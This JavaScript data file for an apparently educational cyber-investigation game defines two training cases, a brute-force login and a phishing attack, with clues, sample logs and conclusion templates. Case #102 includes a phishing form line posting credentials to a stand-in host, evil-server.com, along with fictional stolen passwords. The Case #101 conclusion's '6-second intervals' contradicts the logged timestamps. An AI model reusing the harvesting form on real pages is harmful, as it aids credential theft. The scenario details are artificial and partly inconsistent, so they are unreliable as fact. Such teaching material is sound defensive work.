// caseData.js
// This file contains ALL case-specific data for dynamic switching

// ===== CASE #101 DISCOVERIES =====
export const discoveries101 = [
  {
    id: 1,
    name: "3:00 AM Suspicious Login",
    description: "Found login from 10.12.45.89 at 3 AM",
    evidence: "2024-03-16 03:00:47 LOGIN_SUCCESS jdoe 10.12.45.89",
    xp: 15,
    source: "auth.log",
    nextStep: "Now verify if John was supposed to be working at 3 AM. Use Terminal to check his work schedule.",
    nextStepApp: "terminal",
    nextStepCommand: "cd employees && cat shifts.csv",
    pattern: "success"
  },
  // In your discoveries101 array, Discovery #2 should be:
{
  id: 2,
  name: "Attack Pattern Detected",
  description: "Two failed attempts then success at 3 AM indicates an automated brute-force attack",
  evidence: "02:58:12 LOGIN_FAILED\n02:59:03 LOGIN_FAILED\n03:00:47 LOGIN_SUCCESS",
  xp: 15,
  source: "auth.log",
  nextStep: "This confirms it was an automated attack, not a mistaken password. Next, find WHY the attacker targeted John.",
  nextStepApp: "terminal",
  nextStepCommand: "cd system_info && cat permissions.txt",
  pattern: "attack_pattern"
},
  {
    id: 3,
    name: "John Was OFF Work",
    description: "Verified John was not scheduled to work on March 16. His alibi checks out!",
    evidence: "jdoe,2024-03-16,OFF  ← John was off work",
    xp: 15,
    source: "shifts.csv",
    nextStep: "Great! John is telling the truth. Now find out WHY the attacker targeted him specifically.",
    nextStepApp: "terminal",
    nextStepCommand: "cd system_info && cat permissions.txt",
    pattern: "off_work"
  },
  {
    id: 4,
    name: "Unauthorized HR Access",
    description: "John has HR access despite being in Marketing. This explains why attackers targeted him.",
    evidence: "jdoe (Marketing): HR_READ, SALES_READ, MARKETING_WRITE",
    xp: 15,
    source: "permissions.txt",
    nextStep: "Now you know WHY - John had HR access he shouldn't have. Investigate the suspicious IP address.",
    nextStepApp: "terminal",
    nextStepCommand: "cd logs && grep '10.12.45.89' auth.log",
    pattern: "hr_access"
  },
  {
    id: 5,
    name: "Suspicious IP Identified",
    description: "IP 10.12.45.89 was only active at 3 AM, never during normal hours.",
    evidence: "02:58:12 LOGIN_FAILED\n02:59:03 LOGIN_FAILED\n03:00:47 LOGIN_SUCCESS\n03:15:22 QUERY_EXEC\n03:16:45 LOGOUT",
    xp: 15,
    source: "auth.log (grep)",
    nextStep: "You have all 5 discoveries! Go to Case Notes, write your conclusion, and submit the case.",
    nextStepApp: "case-notes",
    nextStepCommand: null,
    pattern: "ip_identified"
  }
];

// ===== CASE #102 DISCOVERIES =====
export const discoveries102 = [
  {
    id: 1,
    name: "Phishing Email Found",
    description: "Found suspicious email from IT-Support@company-reset.com",
    evidence: "14:32:04 DELIVERED FROM: IT-Support@company-reset.com TO: sarah, mike, lisa, 12 more",
    xp: 15,
    source: "smtp.log",
    nextStep: "Check proxy logs to see who clicked the link",
    nextStepApp: "log-viewer",
    nextStepCommand: "proxy.log",
    pattern: "phishing_email"
  },
  {
    id: 2,
    name: "Victims Identified",
    description: "Sarah, Mike, and Lisa visited the phishing site and entered credentials",
    evidence: "14:35 sarah company-reset.com/login\n14:36 mike company-reset.com/login\n14:38 lisa company-reset.com/login\n14:40-14:45 /submit entries",
    xp: 15,
    source: "proxy.log",
    nextStep: "Examine the phishing page to see where credentials were sent",
    nextStepApp: "file-explorer",
    nextStepCommand: "suspicious_files/phishing_page.html",
    pattern: "victims"
  },
  {
    id: 3,
    name: "Phishing Page Analyzed",
    description: "The fake page submits credentials to evil-server.com",
    evidence: "<form action=\"http://evil-server.com/steal.php\" method=\"POST\">",
    xp: 15,
    source: "phishing_page.html",
    nextStep: "Trace where evil-server.com is located",
    nextStepApp: "terminal",
    nextStepCommand: "nslookup evil-server.com",
    pattern: "page_analysis"
  },
  {
    id: 4,
    name: "Malicious Server Located",
    description: "evil-server.com resolves to IP 185.142.53.89 in Russia",
    evidence: "IP: 185.142.53.89\nLocation: Russia\nISP: Malicious Hosting Ltd",
    xp: 15,
    source: "nslookup",
    nextStep: "Find the stolen credentials file",
    nextStepApp: "file-explorer",
    nextStepCommand: "suspicious_files/credentials.txt",
    pattern: "server_location"
  },
  {
    id: 5,
    name: "Stolen Credentials Found",
    description: "Attacker captured Sarah, Mike, and Lisa's passwords",
    evidence: "sarah:Summer2024!\nmike:sales123\nlisa:finance2024",
    xp: 15,
    source: "credentials.txt",
    nextStep: "Verify file integrity with Hash Verifier",
    nextStepApp: "hash-verifier",
    nextStepCommand: null,
    pattern: "credentials"
  },
  {
    id: 6,
    name: "2FA Saved the Day",
    description: "Attacker tried to use stolen credentials but was BLOCKED by 2FA!",
    evidence: "23:15 VPN_ATTEMPT sarah 185.142.53.89\n23:16 VPN_FAILED sarah 185.142.53.89",
    xp: 15,
    source: "firewall.log",
    nextStep: "Write conclusion in Case Notes",
    nextStepApp: "case-notes",
    nextStepCommand: null,
    pattern: "two_factor"
  }
];

// ===== TITLE TO ID MAPPINGS =====
export const titleToIdMap101 = {
  "3:00 AM Suspicious Login": 1,
  "Attack Pattern Detected": 2,
  "John Was OFF Work": 3,
  "Unauthorized HR Access": 4,
  "Suspicious IP Identified": 5,
  "FINAL CONCLUSION - Case #101": 99 // Special ID for conclusion
};

export const titleToIdMap102 = {
  "Phishing Email Found": 1,
  "Victims Identified": 2,
  "Phishing Page Analyzed": 3,
  "Malicious Server Located": 4,
  "Stolen Credentials Found": 5,
  "2FA Saved the Day": 6,
  "FINAL CONCLUSION - Case #102": 99 // Special ID for conclusion
};

// ===== CASE CONFIGURATIONS =====
export const caseConfigs = {
  '101': {
    title: "The Unauthorized Login",
    requiredDiscoveries: 5,
    collection: "level1progresses",
    color: "#00b4d8", // Cyan
    files: ["auth.log"],
    tools: ["Log Viewer", "File Explorer", "Terminal", "Case Notes"],
    emptyStateGoals: [
      "Find the unauthorized login (3 AM in auth.log)",
      "Identify the attacker's IP (10.12.45.89)",
      "Verify John's alibi (check shifts.csv)",
      "Find why John was targeted (permissions.txt)",
      "Confirm attack pattern (failed attempts)"
    ],
    conclusionTemplate: `═══════════════════════════════════════════════════════
                    FINAL CONCLUSION - CASE #101
═══════════════════════════════════════════════════════

Based on all evidence:

1. John's account was used at 3:00 AM from 10.12.45.89
   (different from his normal IP 10.0.0.45)

2. There were 2 failed attempts before success
   at exactly 6-second intervals - AUTOMATED brute-force attack!

3. John was OFF work on March 16 - he wasn't there
   (verified in shifts.csv)

4. John has HR access (shouldn't for his role)
   - explains WHY attacker targeted him specifically

CONCLUSION: Account was COMPROMISED by automated
brute-force attack. John is VICTIM, not perpetrator.

RECOMMENDATIONS:
• Reset John's password immediately
• Enable two-factor authentication
• Remove John's HR access
• Block IP 10.12.45.89 at firewall
• Review all accounts for similar issues

[🔗 Evidence: auth.log, shifts.csv, permissions.txt]`,
    successMessage: "John's password was 'Summer2023' - a weak password in common hacker dictionaries. An automated tool guessed it in 30 seconds.",
    failureMessage: "Your conclusion missed key evidence. The investigation needs to be restarted."
  },
  '102': {
    title: "The Phishing Trap",
    requiredDiscoveries: 6,
    collection: "level2progresses",
    color: "#f97316", // Orange
    files: ["smtp.log", "proxy.log", "firewall.log"],
    tools: ["Log Viewer", "File Explorer", "Terminal", "Network Scanner", "Hash Verifier", "Case Notes"],
    emptyStateGoals: [
      "Find the phishing email in smtp.log",
      "Identify victims in proxy.log",
      "Analyze phishing_page.html",
      "Trace evil-server.com location",
      "Find stolen credentials in credentials.txt",
      "Verify 2FA stopped the attack in firewall.log"
    ],
    conclusionTemplate: `═══════════════════════════════════════════════════════
                    FINAL CONCLUSION - CASE #102
═══════════════════════════════════════════════════════

Based on all evidence:

1. PHISHING EMAIL: IT-Support@company-reset.com sent to 15 employees
   (Fake domain - not our company)

2. VICTIMS: Sarah (HR), Mike (Sales), Lisa (Finance) clicked the link
   and entered their credentials on the fake page

3. PHISHING PAGE: company-reset.com/login submits to evil-server.com
   (Located in Russia, IP: 185.142.53.89)

4. STOLEN CREDENTIALS: Captured in credentials.txt
   • sarah:Summer2024!
   • mike:sales123
   • lisa:finance2024

5. ATTACKER ATTEMPT: At 11:15 PM, attacker tried VPN access using
   stolen credentials from IP 185.142.53.89

6. 2FA SAVED THE DAY: All attempts FAILED because 2FA was enabled!

CONCLUSION: Successful phishing attack, but 2FA prevented breach.
Credentials were stolen but could not be used.

RECOMMENDATIONS:
• Block company-reset.com and evil-server.com
• Reset passwords for all affected users
• Conduct phishing awareness training
• Keep 2FA enabled for all accounts
• Monitor for similar domains

[🔗 Evidence: smtp.log, proxy.log, firewall.log, phishing_page.html, credentials.txt]`,
    successMessage: "The phishing attack was successful in stealing credentials, but 2FA prevented the breach. All three victims need password resets and security training.",
    failureMessage: "Your conclusion missed key evidence about the phishing attack. The investigation needs to be restarted."
  }
};

// ===== HELPER FUNCTIONS =====
export const getDiscoveriesByCase = (caseNumber) => {
  return caseNumber === '101' ? discoveries101 : discoveries102;
};

export const getTitleToIdMap = (caseNumber) => {
  return caseNumber === '101' ? titleToIdMap101 : titleToIdMap102;
};

export const getCaseConfig = (caseNumber) => {
  return caseConfigs[caseNumber] || caseConfigs['101'];
};

export const getStorageKeys = (caseNumber) => ({
  notes: `case${caseNumber}_notes`,
  discoveries: `case${caseNumber}_discoveries`,
  xp: `case${caseNumber}_xp`,
  completed: `case${caseNumber}_completed`,
  accuracy: `case${caseNumber}_accuracy`,
  finalXP: `case${caseNumber}_final_xp`
});